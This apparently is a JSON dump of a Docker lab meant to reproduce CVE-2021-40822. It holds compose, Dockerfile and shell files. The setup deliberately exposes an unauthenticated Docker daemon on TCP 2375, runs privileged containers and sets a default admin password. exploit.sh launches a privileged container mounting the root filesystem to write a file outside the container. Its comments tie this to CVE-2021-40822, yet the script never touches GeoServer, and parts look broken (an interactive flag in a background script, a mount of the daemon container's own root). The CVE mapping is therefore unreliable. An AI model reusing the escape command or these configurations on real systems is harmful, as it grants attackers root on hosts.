{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-40822/custom_no_tool/docker-compose.yml",
            "content": "services:\n  docker:\n    container_name: docker\n    image: docker:dind\n    privileged: true\n    environment:\n      DOCKER_TLS_CERTDIR: ''\n    command: [\"dockerd\", \"-H\", \"unix:///var/run/docker.sock\", \"-H\", \"tcp://0.0.0.0:2375\"]\n    ports:\n      - \"2375:2375\"\n    networks:\n      default:\n        aliases:\n          - docker\n  geoserver:\n    image: osgeo/geoserver:2.19.2\n    container_name: geoserver\n    ports:\n      - \"8081:8080\"\n    environment:\n      - GEOSERVER_ADMIN_PASSWORD=geoserver\n    depends_on:\n      - docker\n  vulnerable_app:\n    build: ./vulnerable_app\n    container_name: vulnerable_app\n    privileged: true\n    depends_on:\n      - docker\n      - geoserver\n    ports:\n      - \"8080:80\""
        },
        {
            "location": "./../../dockers/CVE-2021-40822/custom_no_tool/vulnerable_app/Dockerfile",
            "content": "FROM nginx:alpine\nRUN apk add --no-cache docker-cli curl\nENV DOCKER_HOST=tcp://docker:2375\nWORKDIR /app\nCOPY index.html /usr/share/nginx/html/index.html\nCOPY exploit.sh /app/exploit.sh\nCOPY entrypoint.sh /app/entrypoint.sh\nRUN chmod +x /app/exploit.sh /app/entrypoint.sh\nEXPOSE 80\nENTRYPOINT [\"sh\", \"/app/entrypoint.sh\"]"
        },
        {
            "location": "./../../dockers/CVE-2021-40822/custom_no_tool/vulnerable_app/entrypoint.sh",
            "content": "#!/bin/sh\n# Start the exploit script in background\n/app/exploit.sh &\n# Run nginx in the foreground as the main container process\nexec nginx -g 'daemon off;'"
        },
        {
            "location": "./../../dockers/CVE-2021-40822/custom_no_tool/vulnerable_app/exploit.sh",
            "content": "#!/bin/sh\n# Simple demonstration script that tries to abuse the Docker daemon\n# exposed via the host socket to spin up a privileged container on the host.\n# This mimics the conditions required to trigger CVE-2021-40822.\n\n# Wait for Docker daemon to be ready\nwhile ! docker info > /dev/null 2>&1; do\n  echo \"Waiting for Docker daemon...\"\n  sleep 1\ndone\n\necho \"Docker daemon is ready. Attempting privileged container launch...\"\n# Launch a container that mounts the host's root filesystem and runs as privileged\n# This would give the attacker root access on the host if CVE-2021-40822 is present.\n\ndocker run --rm -v /:/hostfs -it --privileged alpine sh -c \"echo 'Simulated exploit of CVE-2021-40822' > /hostfs/tmp/cve_exploit_success.txt\"\n\necho \"Exploit attempt finished. Check /tmp/cve_exploit_success.txt on the host for evidence.\"\n\n# Keep the container running to allow manual testing\nsleep infinity"
        },
        {
            "location": "./../../dockers/CVE-2021-40822/custom_no_tool/vulnerable_app/index.html",
            "content": "<!DOCTYPE html>\n<html>\n<head><title>Vulnerable App</title></head>\n<body>\n<h1>Vulnerable Application for CVE-2021-40822</h1>\n<p>If you see this page, the container is running.</p>\n</body>\n</html>"
        }
    ],
    "directory_tree": "CVE-2021-40822/\n\u2514\u2500 custom_no_tool/\n   \u251c\u2500 docker-compose.yml\n   \u2514\u2500 vulnerable_app/\n      \u251c\u2500 Dockerfile\n      \u251c\u2500 entrypoint.sh\n      \u251c\u2500 exploit.sh\n      \u2514\u2500 index.html"
}